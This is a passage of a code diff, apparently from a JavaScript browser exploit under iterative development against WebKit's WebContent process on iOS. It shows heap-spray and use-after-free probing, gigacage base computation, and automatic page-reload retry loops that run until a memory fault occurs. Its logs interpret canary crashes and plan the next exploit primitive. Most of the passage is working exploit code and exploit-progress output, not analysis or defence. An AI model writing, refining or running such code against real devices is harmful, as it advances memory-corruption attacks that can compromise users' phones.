+    }
+    // ── END DUAL PROBE ────────────────────────────────────────────────────────
 
     if (p6Hits > 0) {
       log(`\n[!!!] Phase 6 HIT: crash-reload confirmed (WebContent died on fake StringImpl deref)`);
@@ -2964,9 +3297,9 @@ function checkNodeLeak(nodes, expectedNode) {
         // Stochastic crash probability per probe ≈ P (depends on heap fragmentation).
         // Expected reloads to hit ≈ 1/(29×P). If P≈1% → expected ~3-4 reloads.
         // _injCount = probes where SHRINK fired + spray ran (injected=true) but no process crash
-        const _injCount = _p6bCandToTry.length - p6NoCrashNoAnomaly - p6Crashes;
+        const _injCount = p6InjCount;
         const _retryCount = parseInt(localStorage.getItem('p6b_retry_count') || '0');
-        log(`[P6] All NO-CRASH this pass. SHRINK-injected=${_injCount}/${_p6bCandToTry.length} (p6InjCount=${p6InjCount}), retry=${_retryCount}/${P6B_RETRY_MAX}`);
+        log(`[P6] All NO-CRASH this pass. SHRINK-injected=${_injCount} (p6InjCount=${p6InjCount}), retry=${_retryCount}/${P6B_RETRY_MAX}`);
         if (candidates.length > 0 && gigacageBase !== 0n && _retryCount < P6B_RETRY_MAX) {
           // v56: fixed candidate rotation — always rotate from ORIGINAL list, not previously-rotated list.
           // v55 bug: saved `_rotated` as `candidates` each retry → list shrank when length < 64.
@@ -2989,15 +3322,15 @@ function checkNodeLeak(nodes, expectedNode) {
             };
             localStorage.setItem(P6B_RETRY_KEY, JSON.stringify(_retryData));
             localStorage.setItem('p6b_retry_count', String(_retryCount + 1));
-            log(`[v56 AUTO-RETRY] Scheduling reload ${_retryCount + 1}/${P6B_RETRY_MAX} in 800ms...`);
-            log('[v56 AUTO-RETRY] SHRINK confirmed — crash is stochastic — iterating until KERN_INVALID_ADDRESS');
-            log('[v56 AUTO-RETRY] If page crashes → [P6B HIT] will appear on reload (localStorage checkpoint)');
+            log(`[v57 AUTO-RETRY] Scheduling reload ${_retryCount + 1}/${P6B_RETRY_MAX} in 800ms...`);
+            log('[v57 AUTO-RETRY] SHRINK confirmed — crash is stochastic — iterating until KERN_INVALID_ADDRESS');
+            log('[v57 AUTO-RETRY] If page crashes → [P6B HIT] will appear on reload (localStorage checkpoint)');
             setTimeout(() => { location.reload(); }, 800);
           } catch(_retryErr) {
-            log(`[v56 AUTO-RETRY] localStorage write failed: ${_retryErr} — manual retry needed`);
+            log(`[v57 AUTO-RETRY] localStorage write failed: ${_retryErr} — manual retry needed`);
           }
         } else if (_retryCount >= P6B_RETRY_MAX) {
-          log(`[v56 AUTO-RETRY] ${P6B_RETRY_MAX} retries exhausted — no crash. UAF fires but heap race not won.`);
+          log(`[v57 AUTO-RETRY] ${P6B_RETRY_MAX} retries exhausted — no crash. UAF fires but heap race not won.`);
           log('[P6] Possible causes after 50× retry:');
           log('[P6]   1. gigacageBase wrong — spray VA does not correspond to freed bucket addr');
           log('[P6]   2. bmalloc size-class segregation preventing reclaim of 1024B slot by our spray');
@@ -3026,26 +3359,25 @@ function checkNodeLeak(nodes, expectedNode) {
   log(`\n${'═'.repeat(60)}`);
   log('RESULT SUMMARY');
   log('═'.repeat(60));
-  log(`Oracle:        ${sprayHex.length} spray addrs, HIGH=${highConf.length} candidates`);
-  log(`UAF cases:     ${totalCases} across ${Object.keys(caseGroups).length} size classes`);
+  log(`Oracle:        ${(sprayHex||[]).length} spray addrs (v65: oracle bypassed for canary probe)`);
+  log(`UAF cases:     ${totalCases} phases 3-4 + 1 canary case (v65)`);
   log(`UAF time:      ${elapsed}ms`);
-  log(`Exceptions:    ${uafExceptions}  ← HARD signal`);
+  log(`Exceptions:    ${uafExceptions}  ← HARD signal (phases 3-4)`);
   log(`Node anomaly:  ${nodeAnomalies}  ← MEDIUM signal`);
-  log(`Injections:    ${totalInjections}/${totalCases}  ← SOFT signal (cleanup fired)`);
+  log(`Injections:    ${totalInjections}/${totalCases}  ← SOFT signal (cleanup fired, phases 3-4)`);
+  log(`Canary probe:  p6InjCount=${p6InjCount} p6Crashes=${p6Crashes}  ← v65 key signal`);
   log(`UAF status:    ${hardConfirmed ? '✓ HARD CONFIRMED' : mediumConfirmed ? '✓ MEDIUM CONFIRMED' : softSignal ? '~ SOFT SIGNAL (spray ran)' : 'no signal'}`);
   log('═'.repeat(60));
-  if (highConf.length > 0) {
-    const _hcOff0 = highConf[0].c * P6_PAGE;
-    log('\nNEXT STEP — P6A checkpoint flow:');
-    log(`  sweepOffset (highConf[0]): 0x${_hcOff0.toString(16)}`);
-    log('  IF page crashed during Phase 6A probe:');
-    log('    → RELOAD this page. Base is auto-computed from localStorage checkpoint.');
-    log('  IF page survived but P6B all-crashed:');
-    log('    → Wrong base. Open console, run:');
-    log(`      localStorage.setItem('p6a_checkpoint', JSON.stringify({faultAddr:'<KERN_INVALID_ADDR_FROM_ANALYTICS>', sweepOffset:'0x${_hcOff0.toString(16)}', survived:true}))`);
-    log('    → Reload page.');
-    log('  Analytics path: Settings → Privacy → Analytics & Improvements → Analytics Data → WebContent crash');
-  }
+  log('');
+  log('v65 CANARY PROBE INTERPRETATION:');
+  log('  IF page crashed (reloaded) → [P6B HIT] shows above → stale deref IS live → fix targeting next');
+  log('  IF injected=true NO-CRASH → stale deref path DEAD on iOS 26.5.2 → need different primitive');
+  log('  IF injected=false → SHRINK never fired → opCount threshold logic wrong → debug uafSetup');
+  log('');
+  log('NEXT: Check Settings → Privacy → Analytics & Improvements → Analytics Data');
+  log('  Look for WebContent crash with KERN_INVALID_ADDRESS at 0xDEADBEEFDEADBEEF');
+  log('  If present → canary crash confirmed → deref live');
+  log('  If absent → deref dead → v66 will try different exploit primitive');
 })();
 
 </script>
